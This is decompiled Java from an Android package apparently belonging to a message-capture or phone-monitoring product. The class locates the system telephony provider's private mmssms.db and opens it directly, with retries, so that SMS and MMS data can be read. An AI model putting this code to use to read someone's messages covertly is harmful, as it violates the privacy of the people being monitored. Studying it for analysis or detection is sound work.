package com.vvt.capture.mms.a;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;

class a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static String c = null;
  
  public static SQLiteDatabase a()
  {
    return a(17);
  }
  
  private static SQLiteDatabase a(int paramInt)
  {
    String str1 = c;
    if (str1 == null)
    {
      str1 = com.vvt.n.a.a("com.android.providers.telephony");
      if (str1 != null)
      {
        localObject = "%s/%s";
        int i = 2;
        Object[] arrayOfObject = new Object[i];
        arrayOfObject[0] = str1;
        bool1 = true;
        String str2 = "mmssms.db";
        arrayOfObject[bool1] = str2;
        str1 = String.format((String)localObject, arrayOfObject);
        c = str1;
      }
      boolean bool1 = a;
      if (!bool1) {}
    }
    Object localObject = b(paramInt);
    int j = 5;
    while ((localObject == null) && (j > 0))
    {
      boolean bool2 = b;
      if (bool2) {}
      long l = 1000L;
      SystemClock.sleep(l);
      localObject = b(paramInt);
      j += -1;
    }
    return (SQLiteDatabase)localObject;
  }
  
  private static SQLiteDatabase b(int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    try
    {
      String str = c;
      localSQLiteDatabase = SQLiteDatabase.openDatabase(str, null, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;) {}
    }
    return localSQLiteDatabase;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/mms/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */